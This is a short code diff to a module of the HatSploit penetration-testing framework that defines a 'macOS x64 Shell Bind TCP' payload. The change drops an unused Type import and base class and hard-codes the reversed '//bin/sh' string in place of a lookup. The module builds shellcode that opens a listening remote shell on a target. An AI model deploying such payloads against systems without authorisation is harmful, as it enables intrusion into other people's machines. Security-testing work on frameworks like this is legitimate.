@@ -9,10 +9,9 @@ from hatsploit.lib.payload import Payload
 
 from pex.assembler import Assembler
 from pex.socket import Socket
-from pex.type import Type
 
 
-class HatSploitPayload(Payload, Assembler, Socket, Type):
+class HatSploitPayload(Payload, Assembler, Socket):
     details = {
         'Name': "macOS x64 Shell Bind TCP",
         'Payload': "macos/x64/shell_bind_tcp",
@@ -26,7 +25,7 @@ class HatSploitPayload(Payload, Assembler, Socket, Type):
 
     def run(self):
         bport = self.pack_port(self.handler['BPORT']).hex()
-        shell = (self.shells['sh'][::-1] + b'/').hex()
+        shell = b'//bin/sh'[::-1].hex()
 
         return self.assemble(
             self.details['Architecture'],
